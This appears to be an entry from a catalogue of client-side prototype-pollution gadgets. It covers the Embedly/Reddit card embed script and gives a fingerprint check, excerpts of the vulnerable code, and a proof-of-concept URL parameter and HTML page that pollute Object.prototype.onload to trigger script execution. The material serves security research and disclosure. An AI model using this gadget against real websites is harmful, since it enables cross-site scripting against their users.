## Embedly Cards

URL: https://embed.ly/code

### JS Fingerprint
```
return (typeof window.embedly !== 'undefined')
```

### Vulnerable code fragment
```
https://cdn.embedly.com/widgets/platform.js
https://embed.redditmedia.com/widgets/platform.js
```

```js
m.fetch = function(a, b, c, f) {
    c = e.extend({}, c ? c : {}),
    c.protocol = window.location.protocol,
    c = e.map(b, function(a) {
        return c.override === !0 ? e.extend({}, m.options(a), c) : e.extend({}, c, m.options(a))
    });
    var g = new i
      , h = [];
    c = e.reduce(c, function(c, d, e) {
        var f = new n(a,b[e],d,g.callback());
...

var n = function(a, b, c, d) {
    this.init(a, b, c, d)
};
...
n.prototype.init = function(a, b, c, d) {
    ...
    this.frame = m.build(b, c, a),
    ...
    l.appendChild(this.frame.elem),
```

### PoC

```
?__proto__[onload]=alert(1)
```

```html
<script>
  Object.prototype.onload = 'alert(1)'
</script>

<blockquote class="reddit-card" data-card-created="1603396221">
  <a href="https://www.reddit.com/r/Slackers/comments/c5bfmb/xss_challenge/">XSS Challenge</a>
</blockquote>

<script async src="https://embed.redditmedia.com/widgets/platform.js" charset="UTF-8"></script>
```